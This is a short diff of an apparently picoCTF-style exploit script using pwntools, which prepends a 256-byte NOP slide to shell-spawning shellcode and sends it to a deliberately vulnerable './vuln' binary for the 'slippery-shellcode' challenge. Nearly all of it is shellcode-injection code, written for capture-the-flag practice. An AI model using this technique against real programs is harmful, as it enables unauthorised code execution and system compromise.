@@ -6,11 +6,15 @@ sc = shellcraft.sh()
 
 asm_sc = asm(sc)
 
-program = session.process(['./vuln'], cwd='/problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9')
+nopSlide = b'\x90'*256
+
+nop_asm_sc = nopSlide + asm_sc
+
+program = session.process(['./vuln'], cwd='/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0')
 
 program.recvline()
 
-program.sendline(asm_sc)
+program.sendline(nop_asm_sc)
 
 program.recvline()
 program.recvline()
